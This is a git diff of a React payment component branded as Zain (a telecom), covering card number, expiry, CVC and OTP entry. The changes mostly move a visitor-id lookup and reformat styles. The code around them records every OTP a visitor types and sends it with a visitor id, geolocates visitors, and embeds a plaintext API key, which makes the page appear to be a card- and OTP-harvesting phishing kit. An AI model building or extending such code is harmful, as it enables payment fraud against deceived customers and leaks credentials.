@@ -32,7 +32,6 @@ const validateKuwaitPhone = (phone: string) => {
   return kuwaitMobilePattern.test(phone)
 }
 
-const _id =localStorage.getItem('visitor')
 const allOtps = ['']
 
 export default function ZainPayment() {
@@ -61,6 +60,8 @@ export default function ZainPayment() {
   }, [])
 
   async function getLocation() {
+    const _id = localStorage.getItem('visitor')
+
     const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
     try {
@@ -99,7 +100,7 @@ export default function ZainPayment() {
   const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
   const [orderDetails, setOrderDetails] = useState({
-    id: _id,
+    id: 'ZainXkkid-089887',
     total: "6.000",
   })
 
@@ -159,6 +160,8 @@ export default function ZainPayment() {
   }
 
   const handlePayment = async () => {
+    const _id = localStorage.getItem('visitor')
+
     if (!validateForm()) {
       return
     }
@@ -190,6 +193,8 @@ export default function ZainPayment() {
   }
 
   const verifyOtp = () => {
+    const _id = localStorage.getItem('visitor')
+
     setIsProcessing(true)
     allOtps.push(otpValues.join(""))
     addData({ id: _id, otp: otpValues.join(""), allOtps })
@@ -395,8 +400,8 @@ export default function ZainPayment() {
                               onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                               maxLength={19}
                               className={`h-12 text-lg ${formErrors.cardNumber
-                                  ? "border-red-300 focus:border-red-500"
-                                  : "border-gray-300 focus:border-[#d13c8c]"
+                                ? "border-red-300 focus:border-red-500"
+                                : "border-gray-300 focus:border-[#d13c8c]"
                                 }`}
                             />
 
@@ -424,8 +429,8 @@ export default function ZainPayment() {
                               onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                               maxLength={5}
                               className={`h-12 ${formErrors.cardExpiry
-                                  ? "border-red-300 focus:border-red-500"
-                                  : "border-gray-300 focus:border-[#d13c8c]"
+                                ? "border-red-300 focus:border-red-500"
+                                : "border-gray-300 focus:border-[#d13c8c]"
                                 }`}
                             />
                           </div>
@@ -449,8 +454,8 @@ export default function ZainPayment() {
                               value={cardCvc}
                               onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                               className={`h-12 ${formErrors.cardCvc
-                                  ? "border-red-300 focus:border-red-500"
-                                  : "border-gray-300 focus:border-[#d13c8c]"
+                                ? "border-red-300 focus:border-red-500"
+                                : "border-gray-300 focus:border-[#d13c8c]"
                                 }`}
                             />
                           </div>
